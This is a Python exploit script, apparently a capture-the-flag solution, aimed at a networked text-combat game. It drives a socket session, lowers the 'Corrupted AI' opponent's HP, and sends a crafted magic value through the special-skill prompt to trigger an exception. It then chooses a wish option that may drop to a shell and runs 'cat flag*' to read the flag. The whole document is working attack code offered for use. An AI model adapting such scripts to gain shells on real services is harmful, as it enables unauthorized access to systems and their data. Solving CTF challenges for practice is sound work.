#!/usr/bin/env python3
import socket
import time
import sys

HOST = sys.argv[1] if len(sys.argv) >= 2 else "192.168.100.121"
PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 40021

print(f"[*] Connecting to {HOST}:{PORT}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

s.recv(4096)
s.sendall(b"Hacker\n")
print("[+] Sent player name")

time.sleep(0.2)
s.recv(4096)

print("[*] Combat loop - reducing AI to low HP")

for turn in range(1, 30):
    data = s.recv(4096).decode("utf-8", errors="ignore")

    if "Corrupted AI HP:" in data:
        import re

        match = re.search(r"Corrupted AI HP: (\d+)", data)
        if match:
            ai_hp = int(match.group(1))
            print(f"[Turn {turn}] AI HP: {ai_hp}")

            if ai_hp <= 20:
                print(f"\n[*] AI HP is low ({ai_hp}). Using Special Skill now!")
                s.sendall(b"3\n")
                time.sleep(0.3)

                skill_prompt = s.recv(4096)
                print(skill_prompt.decode("utf-8", errors="ignore"))

                print("[*] Sending magic value: 0xb5f72f1ded389973")
                s.sendall(b"13109393366379073395\n")
                time.sleep(0.5)

                result = s.recv(4096)
                print("[RESULT]")
                print(result.decode("utf-8", errors="ignore"))

                if b"Overload" in result or b"exception" in result.lower():
                    print("\n[!!!] EXCEPTION TRIGGERED [!!!]")

                break

    if "You have defeated the Corrupted AI" in data:
        print(f"\n[SUCCESS] AI defeated!")
        print(data)
        break

    if "You have been defeated" in data:
        print(f"\n[FAIL] We died")
        print(data)
        s.close()
        sys.exit(1)

    if turn % 4 == 0:
        s.sendall(b"4\n")
    else:
        s.sendall(b"1\n")
    time.sleep(0.3)

print("\n[*] Now finishing the fight")
for turn in range(5):
    s.sendall(b"1\n")
    time.sleep(0.3)
    data = s.recv(4096)
    if b"defeated the Corrupted AI" in data:
        print(data.decode("utf-8", errors="ignore"))
        break

print("\n[*] Choosing wish option 2")
s.sendall(b"2\n")
time.sleep(1)

result = s.recv(4096)
result_text = result.decode("utf-8", errors="ignore")
print("=" * 70)
print(result_text)
print("=" * 70)

if "debug" in result_text.lower() or "sh" in result_text.lower():
    print("\n[SUCCESS] Shell detected!")
    s.sendall(b"cat flag*\n")
    time.sleep(0.5)
    print(s.recv(4096).decode("utf-8", errors="ignore"))
else:
    print("\n[*] No shell yet")

s.close()
